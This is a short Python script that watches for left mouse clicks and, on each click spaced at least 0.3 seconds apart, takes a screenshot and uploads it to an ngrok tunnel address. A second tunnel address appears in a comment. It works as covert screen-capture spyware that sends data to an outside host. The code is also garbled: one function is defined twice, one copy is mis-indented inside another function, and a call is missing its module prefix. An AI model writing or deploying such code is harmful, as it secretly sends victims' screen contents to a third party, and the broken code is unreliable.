from mss import mss
import win32api
import time
import requests
#https://d0ee-192-160-130-62.ngrok-free.app
def take_screenshot():
    with mss() as sct:
        try:
            response = requests.get('https://closing-blatantly-wahoo.ngrok-free.app')
            if response.status_code != 200:
                raise Exception('Failed to retrieve website')
        except Exception as e:
            print(f'Failed to retrieve website: {str(e)}')
            return
        screenshot_path = sct.shot(output='screenshot.png')
        requests.post('https://closing-blatantly-wahoo.ngrok-free.app', files={'image': open(screenshot_path, 'rb')})


    def begin_ss(start):
    leftClick = win32api.GetKeyState(0x01)
    if leftClick < 0:
        if time.time() - start > .3:
            take_screenshot()
        start = time.time()
    time.sleep(.001)
    return start


        #sct.shot(output=f"Screenshots/screenshot{time.time()}.png")

def begin_ss(start):
    leftClick = GetKeyState(0x01)
    if leftClick < 0:
        if time.time() - start > .3:
            take_screenshot()
        start = time.time()
    time.sleep(.001)
    return start